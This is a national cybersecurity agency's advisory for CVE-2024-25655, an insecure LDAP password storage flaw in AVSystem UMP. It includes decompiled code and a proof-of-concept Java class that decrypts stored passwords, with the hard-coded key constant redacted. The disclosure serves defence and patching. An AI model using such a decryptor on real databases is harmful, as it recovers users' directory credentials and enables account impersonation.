

[![logo ACN](/static/interazione_app/img/logo_ACN.png)](https://www.acn.gov.it)
[## CVCN

### CENTRO DI VALUTAZIONE E CERTIFICAZIONE NAZIONALE](/cvcn/interazione/)

1. [Home](/cvcn/interazione/)
   >
2. Dettaglio CVE-2024-25655
# CVE-2024-25655

##### Description

Insecure storage of LDAP passwords in the authentication functionality of AVSystem Unified Management Platform (UMP) 23.07.0.16567~LTS allows members (with read access to the application database) to decrypt the LDAP passwords of users who successfully authenticate to web management via LDAP.
##### CVE Link

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25655>

##### CVSS v3.1

**Base Score:** [7.6 HIGH](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H&version=3.1)   **Vector:** CVSS:3.1/[AV:A/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H&version=3.1)

##### Details

### Introduction

AVSystem UMP allows users in a domain directory service to authenticate to the web management through LDAP integration. When a domain user successfully authenticates, its LDAP password is encrypted and stored in the `encryptedpwd` field of the `User` collection in the `smg` application database (*MongoDB*). This is necessary because the product connects to the LDAP directory service to fetch the latest permissions whenever the domain user takes any action.

```

{
    [...]
    "properties":
    {
        "ldapUser" : "true",
        "encryptedpwd" : "[REDACTED_ENCRYPTED_PASSWORD]"
    },
    "login" : "ldapuser",
    "password" : null
}

```

However, the LDAP password can be decrypted by any member with read access to the database. In fact, the encryption relies on a symmetric key derived from the username and a constant string stored in the application codebase. No other secret key is needed to perform the operation.

Specifically, the encryption algorithm is *AES* with key length of 128 bit, *ECB* mode and *PKCS5Padding*. The key is computed taking the first 16 bytes of the *SHA-256* hash of the constant string concatenated to the username: `key=SUBARRAY(SHA-256(CONCAT(constant_string, username)),0,16)`.

```

public final class PasswordSymmetricEncryptor$
{
    [...]
    private static final String algorithm = "AES";

    [...]
    public String decrypt(final String userid, final String encryptedPassword)
    {
        Key key = generateKeyFor(userid);
        Cipher cipher = Cipher.getInstance(algorithm());
        cipher.init(2, key);
        return new String(cipher.doFinal(Base64.decodeBase64(encryptedPassword)), StandardCharsets.UTF_8);
    }

    private Key generateKeyFor(final String login)
    {
        return new SecretKeySpec((byte[]) ArrayOps$.MODULE$.take$extension(Predef$.MODULE$.byteArrayOps(MessageDigest.getInstance(CryptoUtil.ALG_SHA256).
            digest(new StringBuilder(11).
            append([REDACTED_CONSTANT_STRING]).
            append(User.loginToId(login)).
            toString().
            getBytes(StandardCharsets.UTF_8))), 16), algorithm());
    }
}

```

The LDAP user record in the database is created as soon as the user successfully performs authentication on the UMP web management portal, also if that user is not authorized on the portal because it lacks permissions.

To sum up, any member who has read access to the database, such as the *Database Administrator (DBA)*, can decrypt the LDAP password of every user. This will grant them access not only to the web management of this product but also to the user's directory service and all the external services that are connected to it. In the scenario of the product integrated with a corporate Active Directory, the attacker could potentially impersonate a user account and login on domain machines.

### Steps to reproduce

The following Java code implements the Java class to decrypt the LDAP password for a given user.

```

class LdapPasswordDecryptor
{
    public String decrypt(String username, String encryptedPassword) throws Exception
    {
        String sanitisedUsername = username.strip().toLowerCase();
        byte[] aes256Key = MessageDigest.getInstance("SHA-256").
                digest(new StringBuilder(11).
                append([REDACTED_CONSTANT_STRING]).
                append(sanitisedUsername).toString().
                getBytes(StandardCharsets.UTF_8));
        byte[] aes128Key = Arrays.copyOfRange(aes256Key, 0, 16);

        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec key = new SecretKeySpec(aes128Key,"AES");
        cipher.init(2, key);

        byte[] decodedEncryptedPassword = Base64.getUrlDecoder().decode(encryptedPassword);
        return new String(cipher.doFinal(decodedEncryptedPassword), StandardCharsets.UTF_8);
    }
}

```
The `decrypt` method takes in input the `login` and `encryptedpwd` fields from database and returns the cleartext LDAP password.

[![logo ACN](/static/interazione_app/img/logo_ACN.png)
## CVCN

### CENTRO DI VALUTAZIONE E CERTIFICAZIONE NAZIONALE](https://www.acn.gov.it)

###### LINK UTILI

* [FAQ](/cvcn/interazione/faq "FAQ")
* [Privacy Policy](https://www.acn.gov.it/informative/cvcn "FAQ")
* Help Desk
* [Agenzia per la cybersicurezza nazionale](https://www.acn.gov.it "Agenzia per la cybersicurezza nazionale")
* [CSIRT Italia](https://www.csirt.gov.it/ "CSIRT Italia")

